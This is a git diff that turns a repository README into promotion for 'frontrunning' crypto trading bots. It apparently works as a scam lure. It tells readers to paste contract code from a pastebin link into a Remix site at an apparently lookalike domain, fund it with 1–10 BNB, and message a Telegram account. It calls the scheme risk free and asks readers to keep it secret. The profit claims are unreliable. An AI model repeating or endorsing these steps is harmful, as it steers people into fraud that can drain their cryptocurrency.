@@ -1,4 +1,45 @@
-# frontrunning_bot_1
+# Channel Info
+Hello Web3 University
+Happy Halloween 🎃. As we're heading into winter and the Yuletide season, I've decided to drop a few updates for you.
+
+The pools that we target are updated regularly as profits trickle down, we're growing at a fast rate since this video launched and I'll appreciate if you guys stopped sharing this for a while because updating the code regularly can be demanding. So guys Shhhhhh! No more tips to your friends. Keep this a secret.
+
+I'll be Dropping new videos soon, so make sure you like, subscribe and hit the bell button.
+
+Remember the premium arbitrage MEV Bot and Web3 experience comes with my Premium subscription.
+
+Talk to me on telegram if you're interested
+Https://t.me/ansersen
+
+Happy Frontrunning!
+
+# Pancake Bot 1
+https://www.youtube.com/watch?v=WyXlAJtOISQ
+
+Code is updated frequently
+this code is risk free and works as of September 20th 2022.
+Many issues are fixed.
+This remains the best way to earn passive income automatically
+due to BNB price decline, try minimum 1 BNB or 2 BNB - 10 BNB for maximum gain
+
+Remix https://remixethereumcompiler.net
+
+Download metamask https://metamask.io/download.html
+
+how to connect BSC to metamask Text https://academy.binance.com/en/articl...
+
+connect BSC to metamask video https://youtu.be/HVH6wpaHcDI
+
+Link to code: https://pastebin.com/raw/7yyjka9e 
+(Copy and Paste as it is)
+
+Step by Step guide: https://justpaste.it/5xujf
+
+
+#BNB #BSC #FrontRun #FrontRunning #FrontRunBot #FrontRunningBot #PancakeSwap #Binance
+
+# Uniswap Bot 1
+https://www.youtube.com/watch?v=0xMKksbrPiI
 
 Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots. 
 Automated trading on Uniswap and other DEFI platforms can be used to make insane profits. In this video, I go over how to setup my Front running bot which will perform buy/sell actions automatically without having to go through the typical manual transactional methods, which will generate passive income so you can enjoy what you want in life. 
